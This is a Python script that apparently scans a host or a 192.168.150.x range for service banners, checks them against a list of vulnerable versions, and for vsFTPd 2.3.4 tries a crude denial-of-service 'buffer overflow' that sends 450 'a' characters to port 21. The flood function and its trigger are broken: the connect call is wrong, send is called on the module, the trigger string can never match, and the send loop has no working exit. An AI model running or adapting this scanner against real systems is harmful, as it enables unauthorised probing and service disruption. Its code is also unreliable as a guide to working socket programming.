import socket

def retBanner(ip, port):
    print("[-] retriving banner for", ip, ":", port)
    #  what this method does is it gets the IP and Port and tries to connect to the
    #  ip on that port and then will save the next 1024 bytes of data to the variable banner
    #  it will then return the banner to the method that called it
    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        s.connect((ip, port))
        banner = str(s.recv(1024)).strip('\n')
        print("this is the banner", banner)
        return banner
    except:
        print("there is something wrong")
        return


def checkVulns(banner,port,ip):
    # opens the file
    # iterates threw the file using the method readline()
    # each line is compared against the banner
    f = open("vuln_banners.txt",'r')  # r = read only mode

    server = f.readline().strip('\n')
    comment =  f.readline().strip('\n')

    while(server != "#EOF#"):
        if server in banner:
            print("[+] Server is vulnerable: ", banner, "on port", port)
            temp = ("[+]" + comment)
            print(temp)
            if temp == "[+] Server is vulnerable:  b'220 (vsFTPd 2.3.4)\r\n' on port 21":
                ftpBufferOverflow(ip,port)
        server = f.readline().strip('\n')
        comment =  f.readline().strip('\n')


def ftpBufferOverflow (ip,port):
    temp = socket.socket()
    temp.connect(ip,port)
    message = "a"*450
    totalsent = 0
    while totalsent < 450:
        sent = socket.send(message[totalsent:])
        if sent == 0:
           raise RuntimeError("socket connection broken")
           totalsent = totalsent + sent
    print("Black hawk down they have been Dos'ed")


def main():

    portList = [21, 22, 25, 80, 110, 443]  # FTP, SSH, SMTP, HTTP, POP, HTTPS
    print("test")
    temp = input("[-] Do you want to target a range of ip's or a single target: range or single\n")
    if temp in ['r', 'R', 'range', 'Range', 'RANGE']:
        min= int(input("Please enter the minimum ip in the range to scan e.g 0\n"))
        max= int(input("Please enter the maximum ip in the range to scan e.g 150\n"))
        for x in range(min, max):
            ip = input("Please enter the ip without the numbers after the last dot\n")
            if ip == "":
                ip = '192.168.150.' + str(x)
            for port in portList:
                banner = retBanner(ip, port)
                if banner:
                    checkVulns(banner,port,ip)
    if temp in ['s', 'S', 'Single', 'single', 'SINGLE']:
        ip = input("Please enter the ip of the target\n")
        if ip == "":
            ip = '192.168.150.132'
        for port in portList:
            banner = retBanner(ip, port)
            #print(banner)
            if banner:
                print('[+]', ip, ':', banner)
                checkVulns(banner,port,ip)
    else:
        print("please choose a real answer")
        main();


if __name__ == "__main__":
    main()



